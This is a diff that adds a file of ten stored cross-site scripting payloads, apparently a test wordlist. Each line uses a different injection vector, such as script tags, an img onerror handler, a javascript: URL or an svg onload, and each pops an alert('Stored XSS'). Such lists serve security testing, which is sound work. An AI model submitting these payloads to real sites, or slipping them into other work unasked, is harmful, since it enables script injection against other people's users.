@@ -1,0 +1,10 @@
+<script>alert('Stored XSS')</script>
+<img src="x" onerror="alert('Stored XSS')">
+<iframe src="javascript:alert('Stored XSS');"></iframe>
+<svg/onload=alert('Stored XSS')>
+<marquee/onstart=alert('Stored XSS')>
+<math href="javascript:alert('Stored XSS')"></math>
+<body onload=alert('Stored XSS')>
+"><script>alert('Stored XSS')</script>
+<style>@import 'javascript:alert("Stored XSS")';</style>
+<video><source onerror="javascript:alert('Stored XSS');"></video>
